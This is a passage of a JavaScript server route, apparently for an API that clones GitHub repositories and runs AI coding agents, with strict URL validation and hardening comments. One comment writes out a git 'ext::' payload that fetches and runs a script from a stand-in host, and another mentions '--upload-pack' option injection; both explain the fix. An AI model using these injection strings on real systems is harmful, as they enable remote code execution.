import express from 'express';
import { spawn } from 'child_process';
import path from 'path';
import os from 'os';
import { promises as fs } from 'fs';
import crypto from 'crypto';
import { userDb, apiKeysDb, githubTokensDb, projectsDb } from '../modules/database/index.js';
import { queryClaudeSDK, abortClaudeSDKSession, isClaudeSDKSessionActive } from '../claude-sdk.js';
import { createRateLimiter } from '../middleware/rate-limit.js';
import { spawnCursor } from '../cursor-cli.js';
import { queryCodex } from '../openai-codex.js';
import { spawnGemini } from '../gemini-cli.js';
import { spawnOpenCode } from '../opencode-cli.js';
import { spawnKimiAgent } from '../kimi-agent-cli.js';
import { Octokit } from '@octokit/rest';
import { providerModelsService } from '../modules/providers/services/provider-models.service.js';
import { IS_PLATFORM } from '../constants/config.js';
import { normalizeProjectPath, validateWorkspacePath } from '../shared/utils.js';
import { buildTokenPushUrl } from '../utils/gitIdentity.js';
import {
  isProjectPathVisibleToUser,
  isSessionVisibleToUser,
} from '../modules/websocket/services/chat-websocket.service.js';

const router = express.Router();

/**
 * GL-8 (ADR-062): fleet flag reader gating the GLM OpenCode carrier. The single
 * source of truth is server/opencode-cli.js (which does not export it); this route
 * mirrors the same normalization so the REST agent path and the WS dispatch agree.
 * Default OFF — an unset/blank/non-truthy flag never enables the GLM agent surface.
 * @param {NodeJS.ProcessEnv} [env]
 * @returns {boolean}
 */
function isOpenCodeCarrierEnabled(env = process.env) {
  const raw = env?.NASSAJ_OPENCODE_CARRIER;
  if (typeof raw !== 'string') {
    return false;
  }
  const normalized = raw.trim().toLowerCase();
  return normalized === '1' || normalized === 'true' || normalized === 'yes' || normalized === 'on';
}

/**
 * Middleware to authenticate agent API requests.
 *
 * Supports two authentication modes:
 * 1. Platform mode (IS_PLATFORM=true): For managed/hosted deployments where
 *    authentication is handled by an external proxy. Requests are trusted and
 *    the default user context is used.
 *
 * 2. API key mode (default): For self-hosted deployments where users authenticate
 *    via API keys created in the UI. Keys are validated against the local database.
 */
const validateExternalApiKey = (req, res, next) => {
  // Platform mode: Authentication is handled externally (e.g., by a proxy layer).
  // Trust the request and use the default user context.
  if (IS_PLATFORM) {
    try {
      const user = userDb.getFirstUser();
      if (!user) {
        return res.status(500).json({ error: 'Platform mode: No user found in database' });
      }
      req.user = user;
      return next();
    } catch (error) {
      console.error('Platform mode error:', error);
      return res.status(500).json({ error: 'Platform mode: Failed to fetch user' });
    }
  }

  // Self-hosted mode: the API key is read from the `x-api-key` HEADER.
  //
  // SEC-APIKEY-QS: `?apiKey=` used to be accepted on EVERY method/route here.
  // A credential in the query string lands in the reverse-proxy/tunnel access
  // log, the browser history, and the `Referer` of any outbound link — and this
  // one is a PERMANENT credential (no expiry) for the most dangerous
  // authenticated surface in the app (the agent runs with
  // permissionMode:'bypassPermissions'). It also contradicted B-160, which had
  // already narrowed the JWT `?token=` to SSE only (middleware/auth.js).
  //
  // Kept ONLY for the one case that cannot set a header — an EventSource/SSE
  // GET, identified by its spec-mandated `Accept: text/event-stream` — and even
  // then a warning is logged. Everything else must send the header.
  let apiKey = req.headers['x-api-key'];
  let apiKeyFromQuery = false;
  if (!apiKey && typeof req.query.apiKey === 'string' && req.query.apiKey) {
    const accept = req.headers['accept'] || '';
    if (accept.includes('text/event-stream')) {
      apiKey = req.query.apiKey;
      apiKeyFromQuery = true;
    }
  }

  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }

  if (apiKeyFromQuery) {
    console.warn(
      '[agent] DEPRECATED: API key supplied in the query string (SSE fallback). '
      + 'Send it in the x-api-key header — query strings leak into logs, history and Referer.'
    );
  }

  const user = apiKeysDb.validateApiKey(apiKey);

  if (!user) {
    return res.status(401).json({ error: 'Invalid or inactive API key' });
  }

  req.user = user;
  next();
};

/**
 * Get the remote URL of a git repository
 * @param {string} repoPath - Path to the git repository
 * @returns {Promise<string>} - Remote URL of the repository
 */
async function getGitRemoteUrl(repoPath) {
  return new Promise((resolve, reject) => {
    const gitProcess = spawn('git', ['config', '--get', 'remote.origin.url'], {
      cwd: repoPath,
      stdio: ['pipe', 'pipe', 'pipe']
    });

    let stdout = '';
    let stderr = '';

    gitProcess.stdout.on('data', (data) => {
      stdout += data.toString();
    });

    gitProcess.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    gitProcess.on('close', (code) => {
      if (code === 0) {
        resolve(stdout.trim());
      } else {
        reject(new Error(`Failed to get git remote: ${stderr}`));
      }
    });

    gitProcess.on('error', (error) => {
      reject(new Error(`Failed to execute git: ${error.message}`));
    });
  });
}

/**
 * Normalize GitHub URLs for comparison
 * @param {string} url - GitHub URL
 * @returns {string} - Normalized URL
 */
function normalizeGitHubUrl(url) {
  // Remove .git suffix
  let normalized = url.replace(/\.git$/, '');
  // Convert SSH to HTTPS format for comparison
  normalized = normalized.replace(/^git@github\.com:/, 'https://github.com/');
  // Remove trailing slash
  normalized = normalized.replace(/\/$/, '');
  return normalized.toLowerCase();
}

// ---------------------------------------------------------------------------
// SEC-GIT-URL — strict GitHub URL validation (RCE via `git clone`)
// ---------------------------------------------------------------------------
//
// The previous gate was `githubUrl.includes('github.com')`. That is a SUBSTRING
// test, not a URL check, and git's transport layer treats the operand as a
// remote spec, not a URL. Two concrete bypasses this closes:
//
//   1. REMOTE-HELPER RCE — `ext::sh -c curl%20https://evil.tld/x.sh?github.com|sh`
//      contains "github.com", so it passed, and `git clone` then executes it via
//      the `ext::` remote helper => arbitrary code as the `nassaj` user. (Same
//      class: any `<transport>::<payload>` spec.)
//   2. ARGV OPTION INJECTION — a value starting with `-` (e.g.
//      `--upload-pack=<cmd>`) is consumed by `git clone` as an OPTION, not as
//      the repo operand.
//
// The gate below is an allowlist: the value must PARSE as a URL, be https, be
// exactly host `github.com`, carry no credentials/port/query/fragment, and have
// an `/<owner>/<repo>` path of safe characters. The URL handed to git is then
// REBUILT from the validated parts (never the raw input), and `--` precedes it
// in argv so nothing can be read as an option.

/** GitHub account names: alphanumeric + hyphen, ≤ 39 chars. */
const GITHUB_OWNER_PATTERN = /^[A-Za-z0-9][A-Za-z0-9-]{0,38}$/;
/** Repository names: alphanumeric plus . _ - ; must start alphanumeric. */
const GITHUB_REPO_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$/;

/**
 * Validates a client-supplied GitHub repository URL and returns its canonical
 * form. Throws on ANYTHING that is not a plain https github.com repo URL.
 *
 * @param {unknown} rawUrl candidate URL (untrusted request input)
 * @returns {{owner: string, repo: string, cloneUrl: string}} canonical parts
 * @throws {Error} generic 'Invalid GitHub URL' on every rejection
 */
export function parseSafeGitHubUrl(rawUrl) {
  const reject = () => {
    throw new Error('Invalid GitHub URL');
  };

  if (typeof rawUrl !== 'string') {
    reject();
  }
  const candidate = rawUrl.trim();
  // A leading '-' would be read by git as an option even before URL parsing.
  if (!candidate || candidate.startsWith('-')) {
    reject();
  }

  let parsed;
  try {
    parsed = new URL(candidate);
  } catch {
    reject();
  }

  // `ext::`, `git::`, `ssh://`, `file://`, `http://`, … all die here: only the
  // https scheme is accepted, and URL parsing already normalized the host.
  if (parsed.protocol !== 'https:') {
    reject();
  }
  // Exact host match — not endsWith (blocks `github.com.evil.tld`) and not
  // includes (blocks `evil.tld/?github.com`).
  if (parsed.hostname.toLowerCase() !== 'github.com') {
    reject();
  }
  if (parsed.port || parsed.username || parsed.password || parsed.search || parsed.hash) {
    reject();
  }

  const segments = parsed.pathname.split('/').filter(Boolean);
  if (segments.length !== 2) {
    reject();
  }

  const owner = decodeURIComponent(segments[0]);
  const repo = decodeURIComponent(segments[1]).replace(/\.git$/i, '');

  if (!GITHUB_OWNER_PATTERN.test(owner) || !GITHUB_REPO_PATTERN.test(repo)) {
    reject();
  }

  // Rebuilt from validated parts — the raw input never reaches git.
  return { owner, repo, cloneUrl: `https://github.com/${owner}/${repo}.git` };
}

/**
 * Same strictness for a remote URL READ BACK from a repository's git config
 * (`git config --get remote.origin.url`). That value is not direct request
 * input, but it IS attacker-influenced (a cloned repo, or a workspace path the
 * caller controls), and the old check there was also `.includes('github.com')`.
 * Accepts the two canonical github forms only.
 *
 * @param {unknown} rawUrl remote URL as stored in .git/config
 * @returns {{owner: string, repo: string, cloneUrl: string}}
 * @throws {Error} 'Invalid GitHub URL' when it is not a github.com remote
 */
export function parseSafeGitHubRemote(rawUrl) {
  if (typeof rawUrl !== 'string') {
    throw new Error('Invalid GitHub URL');
  }
  const candidate = rawUrl.trim();

  // scp-like SSH form: git@github.com:owner/repo(.git)
  const sshMatch = /^git@github\.com:([^/]+)\/(.+)$/i.exec(candidate);
  if (sshMatch) {
    const owner = sshMatch[1];
    const repo = sshMatch[2].replace(/\.git$/i, '');
    if (!GITHUB_OWNER_PATTERN.test(owner) || !GITHUB_REPO_PATTERN.test(repo)) {
      throw new Error('Invalid GitHub URL');
    }
    return { owner, repo, cloneUrl: `https://github.com/${owner}/${repo}.git` };
  }

  return parseSafeGitHubUrl(candidate);
}

/**
 * Parse GitHub URL to extract owner and repo.
 * Thin wrapper over the strict validator above so every caller shares ONE
 * policy (the old permissive regex accepted `ext::…github.com/a/b`). Exported
 * for the SEC-GIT-URL regression suite.
 * @param {string} url - GitHub URL (HTTPS or SSH)
 * @returns {{owner: string, repo: string}} - Parsed owner and repo
 */
export function parseGitHubUrl(url) {
  const { owner, repo } = parseSafeGitHubRemote(url);
  return { owner, repo };
}

/**
 * Auto-generate a branch name from a message
 * @param {string} message - The agent message
 * @returns {string} - Generated branch name
 */
function autogenerateBranchName(message) {
  // Convert to lowercase, replace spaces/special chars with hyphens
  let branchName = message
    .toLowerCase()
    .replace(/[^a-z0-9\s-]/g, '') // Remove special characters
    .replace(/\s+/g, '-') // Replace spaces with hyphens
    .replace(/-+/g, '-') // Replace multiple hyphens with single
    .replace(/^-|-$/g, ''); // Remove leading/trailing hyphens

  // Ensure non-empty fallback
  if (!branchName) {
    branchName = 'task';
  }

  // Generate timestamp suffix (last 6 chars of base36 timestamp)
  const timestamp = Date.now().toString(36).slice(-6);
  const suffix = `-${timestamp}`;

  // Limit length to ensure total length including suffix fits within 50 characters
  const maxBaseLength = 50 - suffix.length;
  if (branchName.length > maxBaseLength) {
    branchName = branchName.substring(0, maxBaseLength);
  }

  // Remove any trailing hyphen after truncation and ensure no leading hyphen
  branchName = branchName.replace(/-$/, '').replace(/^-+/, '');

  // If still empty or starts with hyphen after cleanup, use fallback
  if (!branchName || branchName.startsWith('-')) {
    branchName = 'task';
  }

  // Combine base name with timestamp suffix
  branchName = `${branchName}${suffix}`;

  // Final validation: ensure it matches safe pattern
  if (!/^[a-z0-9]+(?:-[a-z0-9]+)*$/.test(branchName)) {
    // Fallback to deterministic safe name
    return `branch-${timestamp}`;
  }

  return branchName;
}

/**
 * Validate a Git branch name
 * @param {string} branchName - Branch name to validate
 * @returns {{valid: boolean, error?: string}} - Validation result
 */
function validateBranchName(branchName) {
  if (!branchName || branchName.trim() === '') {
    return { valid: false, error: 'Branch name cannot be empty' };
  }

  // Git branch name rules
  const invalidPatterns = [
    { pattern: /^\./, message: 'Branch name cannot start with a dot' },
    { pattern: /\.$/, message: 'Branch name cannot end with a dot' },
    { pattern: /\.\./, message: 'Branch name cannot contain consecutive dots (..)' },
    { pattern: /\s/, message: 'Branch name cannot contain spaces' },
    { pattern: /[~^:?*\[\\]/, message: 'Branch name cannot contain special characters: ~ ^ : ? * [ \\' },
    { pattern: /@{/, message: 'Branch name cannot contain @{' },
    { pattern: /\/$/, message: 'Branch name cannot end with a slash' },
    { pattern: /^\//, message: 'Branch name cannot start with a slash' },
    { pattern: /\/\//, message: 'Branch name cannot contain consecutive slashes' },
    { pattern: /\.lock$/, message: 'Branch name cannot end with .lock' }
  ];

  for (const { pattern, message } of invalidPatterns) {
    if (pattern.test(branchName)) {
      return { valid: false, error: message };
    }
  }

  // Check for ASCII control characters
  if (/[\x00-\x1F\x7F]/.test(branchName)) {
    return { valid: false, error: 'Branch name cannot contain control characters' };
  }

  return { valid: true };
}

/**
 * Get recent commit messages from a repository
 * @param {string} projectPath - Path to the git repository
 * @param {number} limit - Number of commits to retrieve (default: 5)
 * @returns {Promise<string[]>} - Array of commit messages
 */
async function getCommitMessages(projectPath, limit = 5) {
  return new Promise((resolve, reject) => {
    const gitProcess = spawn('git', ['log', `-${limit}`, '--pretty=format:%s'], {
      cwd: projectPath,
      stdio: ['pipe', 'pipe', 'pipe']
    });

    let stdout = '';
    let stderr = '';

    gitProcess.stdout.on('data', (data) => {
      stdout += data.toString();
    });

    gitProcess.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    gitProcess.on('close', (code) => {
      if (code === 0) {
        const messages = stdout.trim().split('\n').filter(msg => msg.length > 0);
        resolve(messages);
      } else {
        reject(new Error(`Failed to get commit messages: ${stderr}`));
      }
    });

    gitProcess.on('error', (error) => {
      reject(new Error(`Failed to execute git: ${error.message}`));
    });
  });
}

/**
 * Create a new branch on GitHub using the API
 * @param {Octokit} octokit - Octokit instance
 * @param {string} owner - Repository owner
 * @param {string} repo - Repository name
 * @param {string} branchName - Name of the new branch
 * @param {string} baseBranch - Base branch to branch from (default: 'main')
 * @returns {Promise<void>}
 */
async function createGitHubBranch(octokit, owner, repo, branchName, baseBranch = 'main') {
  try {
    // Get the SHA of the base branch
    const { data: ref } = await octokit.git.getRef({
      owner,
      repo,
      ref: `heads/${baseBranch}`
    });

    const baseSha = ref.object.sha;

    // Create the new branch
    await octokit.git.createRef({
      owner,
      repo,
      ref: `refs/heads/${branchName}`,
      sha: baseSha
    });

    console.log(`✅ Created branch '${branchName}' on GitHub`);
  } catch (error) {
    if (error.status === 422 && error.message.includes('Reference already exists')) {
      console.log(`ℹ️ Branch '${branchName}' already exists on GitHub`);
    } else {
      throw error;
    }
  }
}

/**
 * Create a pull request on GitHub
 * @param {Octokit} octokit - Octokit instance
 * @param {string} owner - Repository owner
 * @param {string} repo - Repository name
 * @param {string} branchName - Head branch name
 * @param {string} title - PR title
 * @param {string} body - PR body/description
 * @param {string} baseBranch - Base branch (default: 'main')
 * @returns {Promise<{number: number, url: string}>} - PR number and URL
 */
async function createGitHubPR(octokit, owner, repo, branchName, title, body, baseBranch = 'main') {
  const { data: pr } = await octokit.pulls.create({
    owner,
    repo,
    title,
    head: branchName,
    base: baseBranch,
    body
  });

  console.log(`✅ Created pull request #${pr.number}: ${pr.html_url}`);

  return {
    number: pr.number,
    url: pr.html_url
  };
}

/**
 * Clone a GitHub repository to a directory
 * @param {string} githubUrl - GitHub repository URL
 * @param {string} githubToken - Optional GitHub token for private repos
 * @param {string} projectPath - Path for cloning the repository
 * @returns {Promise<string>} - Path to the cloned repository
 */
async function cloneGitHubRepo(githubUrl, githubToken = null, projectPath) {
  return new Promise(async (resolve, reject) => {
    try {
      // SEC-GIT-URL: allowlist validation (see parseSafeGitHubUrl). Replaces the
      // `.includes('github.com')` substring test that let `ext::sh -c …` through.
      const { owner, repo, cloneUrl: canonicalUrl } = parseSafeGitHubUrl(githubUrl);

      const cloneDir = path.resolve(projectPath);

      // Check if directory already exists
      try {
        await fs.access(cloneDir);
        // Directory exists - check if it's a git repo with the same URL
        try {
          const existingUrl = await getGitRemoteUrl(cloneDir);
          const normalizedExisting = normalizeGitHubUrl(existingUrl);
          const normalizedRequested = normalizeGitHubUrl(canonicalUrl);

          if (normalizedExisting === normalizedRequested) {
            console.log('✅ Repository already exists at path with correct URL');
            return resolve(cloneDir);
          } else {
            throw new Error(`Directory ${cloneDir} already exists with a different repository (${existingUrl}). Expected: ${githubUrl}`);
          }
        } catch (gitError) {
          throw new Error(`Directory ${cloneDir} already exists but is not a valid git repository or git command failed`);
        }
      } catch (accessError) {
        // Directory doesn't exist - proceed with clone
      }

      // Ensure parent directory exists
      await fs.mkdir(path.dirname(cloneDir), { recursive: true });

      // Build the clone URL from the VALIDATED parts only. With a token it
      // becomes https://<token>@github.com/<owner>/<repo>.git; the token is
      // percent-encoded so a value containing '/', '@' or '#' cannot re-point
      // the URL at another host. Never logged (only canonicalUrl is).
      const cloneUrl = githubToken
        ? `https://${encodeURIComponent(githubToken)}@github.com/${owner}/${repo}.git`
        : canonicalUrl;

      console.log('🔄 Cloning repository:', canonicalUrl);
      console.log('📁 Destination:', cloneDir);

      // Execute git clone. `--` ends option parsing so neither the URL nor the
      // destination can ever be consumed as a flag (`--upload-pack=…`).
      const gitProcess = spawn('git', ['clone', '--depth', '1', '--', cloneUrl, cloneDir], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      let stdout = '';
      let stderr = '';

      gitProcess.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      gitProcess.stderr.on('data', (data) => {
        stderr += data.toString();
        console.log('Git stderr:', data.toString());
      });

      gitProcess.on('close', (code) => {
        if (code === 0) {
          console.log('✅ Repository cloned successfully');
          resolve(cloneDir);
        } else {
          console.error('❌ Git clone failed:', stderr);
          reject(new Error(`Git clone failed: ${stderr}`));
        }
      });

      gitProcess.on('error', (error) => {
        reject(new Error(`Failed to execute git: ${error.message}`));
      });
    } catch (error) {
      reject(error);
    }
  });
}

/**
 * Clean up a temporary project directory and its Claude session
 * @param {string} projectPath - Path to the project directory
 * @param {string} sessionId - Session ID to clean up
 */
async function cleanupProject(projectPath, sessionId = null) {
  try {
    // Only clean up projects in the external-projects directory
    if (!projectPath.includes('.claude/external-projects')) {
      console.warn('⚠️ Refusing to clean up non-external project:', projectPath);
      return;
    }

    console.log('🧹 Cleaning up project:', projectPath);
    await fs.rm(projectPath, { recursive: true, force: true });
    console.log('✅ Project cleaned up');

    // Also clean up the Claude session directory if sessionId provided
    if (sessionId) {
      try {
        const sessionPath = path.join(os.homedir(), '.claude', 'sessions', sessionId);
        console.log('🧹 Cleaning up session directory:', sessionPath);
        await fs.rm(sessionPath, { recursive: true, force: true });
        console.log('✅ Session directory cleaned up');
      } catch (error) {
        console.error('⚠️ Failed to clean up session directory:', error.message);
      }
    }
  } catch (error) {
    console.error('❌ Failed to clean up project:', error);
  }
}

/**
 * SSE Stream Writer - Adapts SDK/CLI output to Server-Sent Events
 */
class SSEStreamWriter {
  constructor(res, userId = null) {
    this.res = res;
    this.sessionId = null;
    this.userId = userId;
    this.isSSEStreamWriter = true;  // Marker for transport detection
    // SEC-SSE-ABORT: set when the HTTP client vanished mid-run. `writableEnded`
    // alone does NOT cover this — after a client disconnect the response is not
    // "ended", so every subsequent provider chunk kept being written into a dead
    // socket for the whole run.
    this.clientGone = false;
  }

  /** Marks the peer as gone; all further writes become no-ops. */
  markClientGone() {
    this.clientGone = true;
  }

  send(data) {
    if (this.clientGone || this.res.writableEnded) {
      return;
    }

    // Format as SSE - providers send raw objects, we stringify
    this.res.write(`data: ${JSON.stringify(data)}\n\n`);
  }

  end() {
    if (!this.clientGone && !this.res.writableEnded) {
      this.res.write('data: {"type":"done"}\n\n');
      this.res.end();
    }
  }

  setSessionId(sessionId) {
    this.sessionId = sessionId;
    this.send({ type: 'session-id', sessionId });
  }

  getSessionId() {
    return this.sessionId;
  }
}

/**
 * Non-streaming response collector
 */
class ResponseCollector {
  constructor(userId = null) {
    this.messages = [];
    this.sessionId = null;
    this.userId = userId;
  }

  send(data) {
    // Store ALL messages for now - we'll filter when returning
    this.messages.push(data);

    // Extract sessionId if present
    if (typeof data === 'string') {
      try {
        const parsed = JSON.parse(data);
        if (parsed.sessionId) {
          this.sessionId = parsed.sessionId;
        }
      } catch (e) {
        // Not JSON, ignore
      }
    } else if (data && data.sessionId) {
      this.sessionId = data.sessionId;
    }
  }

  end() {
    // Do nothing - we'll collect all messages
  }

  setSessionId(sessionId) {
    this.sessionId = sessionId;
  }

  getSessionId() {
    return this.sessionId;
  }

  getMessages() {
    return this.messages;
  }

  /**
   * Get filtered assistant messages only
   */
  getAssistantMessages() {
    const assistantMessages = [];

    for (const msg of this.messages) {
      // Skip initial status message
      if (msg && msg.type === 'status') {
        continue;
      }

      // Handle JSON strings
      if (typeof msg === 'string') {
        try {
          const parsed = JSON.parse(msg);
          // Only include claude-response messages with assistant type
          if (parsed.type === 'claude-response' && parsed.data && parsed.data.type === 'assistant') {
            assistantMessages.push(parsed.data);
          }
        } catch (e) {
          // Not JSON, skip
        }
      }
    }

    return assistantMessages;
  }

  /**
   * Calculate total tokens from all messages
   */
  getTotalTokens() {
    let totalInput = 0;
    let totalOutput = 0;
    let totalCacheRead = 0;
    let totalCacheCreation = 0;

    for (const msg of this.messages) {
      let data = msg;

      // Parse if string
      if (typeof msg === 'string') {
        try {
          data = JSON.parse(msg);
        } catch (e) {
          continue;
        }
      }

      // Extract usage from claude-response messages
      if (data && data.type === 'claude-response' && data.data) {
        const msgData = data.data;
        if (msgData.message && msgData.message.usage) {
          const usage = msgData.message.usage;
          totalInput += usage.input_tokens || 0;
          totalOutput += usage.output_tokens || 0;
          totalCacheRead += usage.cache_read_input_tokens || 0;
          totalCacheCreation += usage.cache_creation_input_tokens || 0;
        }
      }
    }

    return {
      inputTokens: totalInput,
      outputTokens: totalOutput,
      cacheReadTokens: totalCacheRead,
      cacheCreationTokens: totalCacheCreation,
      totalTokens: totalInput + totalOutput + totalCacheRead + totalCacheCreation
    };
  }
}

// ===============================
// External API Endpoint
// ===============================

/**
 * POST /api/agent
 *
 * Trigger an AI agent to work on a project.
 * Supports automatic GitHub branch and pull request creation after successful completion.
 *
 * ================================================================================================
 * REQUEST BODY PARAMETERS
 * ================================================================================================
 *
 * @param {string} githubUrl - (Conditionally Required) GitHub repository URL to clone.
 *                             Supported formats:
 *                             - HTTPS: https://github.com/owner/repo
 *                             - HTTPS with .git: https://github.com/owner/repo.git
 *                             - SSH: git@github.com:owner/repo
 *                             - SSH with .git: git@github.com:owner/repo.git
 *
 * @param {string} projectPath - (Conditionally Required) Path to existing project OR destination for cloning.
 *                               Behavior depends on usage:
 *                               - If used alone: Must point to existing project directory
 *                               - If used with githubUrl: Target location for cloning
 *                               - If omitted with githubUrl: Auto-generates temporary path in ~/.claude/external-projects/
 *
 * @param {string} message - (Required) Task description for the AI agent. Used as:
 *                          - Instructions for the agent
 *                          - Source for auto-generated branch names (if createBranch=true and no branchName)
 *                          - Fallback for PR title if no commits are made
 *
 * @param {string} provider - (Optional) AI provider to use. Options: 'claude' | 'cursor' | 'codex' | 'gemini' | 'opencode'
 *                           Default: 'claude'
 *
 * @param {boolean} stream - (Optional) Enable Server-Sent Events (SSE) streaming for real-time updates.
 *                          Default: true
 *                          - true: Returns text/event-stream with incremental updates
 *                          - false: Returns complete JSON response after completion
 *
 * @param {string} model - (Optional) Model identifier for providers.
 *
 *                        Claude models: 'sonnet' (default), 'opus', 'haiku', 'opusplan', 'sonnet[1m]'
 *                        Cursor models: 'gpt-5' (default), 'gpt-5.2', 'gpt-5.2-high', 'sonnet-4.5', 'opus-4.5',
 *                                       'gemini-3-pro', 'composer-1', 'auto', 'gpt-5.1', 'gpt-5.1-high',
 *                                       'gpt-5.1-codex', 'gpt-5.1-codex-high', 'gpt-5.1-codex-max',
 *                                       'gpt-5.1-codex-max-high', 'opus-4.1', 'grok', and thinking variants
 *                        Codex models: 'gpt-5.2' (default), 'gpt-5.1-codex-max', 'o3', 'o4-mini'
 *
 * @param {boolean} cleanup - (Optional) Auto-cleanup project directory after completion.
 *                           Default: true
 *                           Behavior:
 *                           - Only applies when cloning via githubUrl (not for existing projectPath)
 *                           - Deletes cloned repository after 5 seconds
 *                           - Also deletes associated Claude session directory
 *                           - Remote branch and PR remain on GitHub if created
 *
 * @param {string} githubToken - (Optional) GitHub Personal Access Token for authentication.
 *                              Overrides stored token from user settings.
 *                              Required for:
 *                              - Private repositories
 *                              - Branch/PR creation features
 *                              Token must have 'repo' scope for full functionality.
 *
 * @param {string} branchName - (Optional) Custom name for the Git branch.
 *                             If provided, createBranch is automatically set to true.
 *                             Validation rules (errors returned if violated):
 *                             - Cannot be empty or whitespace only
 *                             - Cannot start or end with dot (.)
 *                             - Cannot contain consecutive dots (..)
 *                             - Cannot contain spaces
 *                             - Cannot contain special characters: ~ ^ : ? * [ \
 *                             - Cannot contain @{
 *                             - Cannot start or end with forward slash (/)
 *                             - Cannot contain consecutive slashes (//)
 *                             - Cannot end with .lock
 *                             - Cannot contain ASCII control characters
 *                             Examples: 'feature/user-auth', 'bugfix/login-error', 'refactor/db-optimization'
 *
 * @param {boolean} createBranch - (Optional) Create a new Git branch after successful agent completion.
 *                                Default: false (or true if branchName is provided)
 *                                Behavior:
 *                                - Creates branch locally and pushes to remote
 *                                - If branch exists locally: Checks out existing branch (no error)
 *                                - If branch exists on remote: Uses existing branch (no error)
 *                                - Branch name: Custom (if branchName provided) or auto-generated from message
 *                                - Requires either githubUrl OR projectPath with GitHub remote
 *
 * @param {boolean} createPR - (Optional) Create a GitHub Pull Request after successful completion.
 *                            Default: false
 *                            Behavior:
 *                            - PR title: First commit message (or fallback to message parameter)
 *                            - PR description: Auto-generated from all commit messages
 *                            - Base branch: Always 'main' (currently hardcoded)
 *                            - If PR already exists: GitHub returns error with details
 *                            - Requires either githubUrl OR projectPath with GitHub remote
 *
 * ================================================================================================
 * PATH HANDLING BEHAVIOR
 * ================================================================================================
 *
 * Scenario 1: Only githubUrl provided
 *   Input:  { githubUrl: "https://github.com/owner/repo" }
 *   Action: Clones to auto-generated temporary path: ~/.claude/external-projects/<hash>/
 *   Cleanup: Yes (if cleanup=true)
 *
 * Scenario 2: Only projectPath provided
 *   Input:  { projectPath: "/home/user/my-project" }
 *   Action: Uses existing project at specified path
 *   Validation: Path must exist and be accessible
 *   Cleanup: No (never cleanup existing projects)
 *
 * Scenario 3: Both githubUrl and projectPath provided
 *   Input:  { githubUrl: "https://github.com/owner/repo", projectPath: "/custom/path" }
 *   Action: Clones githubUrl to projectPath location
 *   Validation:
 *     - If projectPath exists with git repo:
 *       - Compares remote URL with githubUrl
 *       - If URLs match: Reuses existing repo
 *       - If URLs differ: Returns error
 *   Cleanup: Yes (if cleanup=true)
 *
 * ================================================================================================
 * GITHUB BRANCH/PR CREATION REQUIREMENTS
 * ================================================================================================
 *
 * For createBranch or createPR to work, one of the following must be true:
 *
 * Option A: githubUrl provided
 *   - Repository URL directly specified
 *   - Works with both cloning and existing paths
 *
 * Option B: projectPath with GitHub remote
 *   - Project must be a Git repository
 *   - Must have 'origin' remote configured
 *   - Remote URL must point to github.com
 *   - System auto-detects GitHub URL via: git remote get-url origin
 *
 * Additional Requirements:
 *   - Valid GitHub token (from settings or githubToken parameter)
 *   - Token must have 'repo' scope for private repos
 *   - Project must have commits (for PR creation)
 *
 * ================================================================================================
 * VALIDATION & ERROR HANDLING
 * ================================================================================================
 *
 * Input Validations (400 Bad Request):
 *   - Either githubUrl OR projectPath must be provided (not neither)
 *   - message must be non-empty string
 *   - provider must be 'claude', 'cursor', 'codex', 'gemini', or 'opencode'
 *   - createBranch/createPR requires githubUrl OR projectPath (not neither)
 *   - branchName must pass Git naming rules (if provided)
 *
 * Runtime Validations (500 Internal Server Error or specific error in response):
 *   - projectPath must exist (if used alone)
 *   - GitHub URL format must be valid
 *   - Git remote URL must include github.com (for projectPath + branch/PR)
 *   - GitHub token must be available (for private repos and branch/PR)
 *   - Directory conflicts handled (existing path with different repo)
 *
 * Branch Name Validation Errors (returned in response, not HTTP error):
 *   Invalid names return: { branch: { error: "Invalid branch name: <reason>" } }
 *   Examples:
 *   - "my branch" → "Branch name cannot contain spaces"
 *   - ".feature" → "Branch name cannot start with a dot"
 *   - "feature.lock" → "Branch name cannot end with .lock"
 *
 * ================================================================================================
 * RESPONSE FORMATS
 * ================================================================================================
 *
 * Streaming Response (stream=true):
 *   Content-Type: text/event-stream
 *   Events:
 *     - { type: "status", message: "...", projectPath: "..." }
 *     - { type: "claude-response", data: {...} }
 *     - { type: "github-branch", branch: { name: "...", url: "..." } }
 *     - { type: "github-pr", pullRequest: { number: 42, url: "..." } }
 *     - { type: "github-error", error: "..." }
 *     - { type: "done" }
 *
 * Non-Streaming Response (stream=false):
 *   Content-Type: application/json
 *   {
 *     success: true,
 *     sessionId: "session-123",
 *     messages: [...],        // Assistant messages only (filtered)
 *     tokens: {
 *       inputTokens: 150,
 *       outputTokens: 50,
 *       cacheReadTokens: 0,
 *       cacheCreationTokens: 0,
 *       totalTokens: 200
 *     },
 *     projectPath: "/path/to/project",
 *     branch: {               // Only if createBranch=true
 *       name: "feature/xyz",
 *       url: "https://github.com/owner/repo/tree/feature/xyz"
 *     } | { error: "..." },
 *     pullRequest: {          // Only if createPR=true
 *       number: 42,
 *       url: "https://github.com/owner/repo/pull/42"
 *     } | { error: "..." }
 *   }
 *
 * Error Response:
 *   HTTP Status: 400, 401, 500
 *   Content-Type: application/json
 *   { success: false, error: "Error description" }
 *
 * ================================================================================================
 * EXAMPLES
 * ================================================================================================
 *
 * Example 1: Clone and process with auto-cleanup
 *   POST /api/agent
 *   { "githubUrl": "https://github.com/user/repo", "message": "Fix bug" }
 *
 * Example 2: Use existing project with custom branch and PR
 *   POST /api/agent
 *   {
 *     "projectPath": "/home/user/project",
 *     "message": "Add feature",
 *     "branchName": "feature/new-feature",
 *     "createPR": true
 *   }
 *
 * Example 3: Clone to specific path with auto-generated branch
 *   POST /api/agent
 *   {
 *     "githubUrl": "https://github.com/user/repo",
 *     "projectPath": "/tmp/work",
 *     "message": "Refactor code",
 *     "createBranch": true,
 *     "cleanup": false
 *   }
 */
// SEC-AGENT-RL: /api/agent is the most dangerous authenticated surface in the
// app — it runs an agent with permissionMode:'bypassPermissions' inside a
// workspace, spawns git subprocesses, and (with createPR) talks to the GitHub
// API. It had NO rate limit at all, so a single leaked API key could be used to
// fan out unbounded concurrent agent runs (CPU/RAM exhaustion of the whole box,
// plus provider-quota burn). Same in-memory per-IP limiter used on the auth
// endpoints (middleware/rate-limit.js). Deliberately generous — agent runs are
